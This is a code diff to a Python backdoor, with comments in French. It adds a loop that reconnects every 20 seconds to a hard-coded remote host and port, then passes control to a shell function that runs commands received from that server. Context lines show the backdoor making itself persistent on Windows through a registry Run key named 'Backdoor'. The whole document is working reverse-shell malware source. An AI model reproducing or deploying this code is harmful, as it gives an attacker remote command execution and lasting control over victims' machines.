@@ -5,6 +5,7 @@ import subprocess
 import json
 import os
 import sys
+import time
 
 def reliable_send(data):
     print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
@@ -27,6 +28,15 @@ def reliable_recv():
         except ValueError:
             continue
 
+def connection():
+    # ajout d'une tentative de connexion toute les 20 secondes au serveur
+    while True:
+        time.sleep(20)
+        try:
+            sock.connect(("192.168.0.45", 54321))
+            shell()
+        except:
+            connection()
 def shell():
     while True:
         command = reliable_recv()
@@ -74,8 +84,7 @@ def createBackdoorOnWindowsMachine():
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("192.168.0.45", 54321))
 
 if __name__ == '__main__':
-    shell()
+    connection()
 
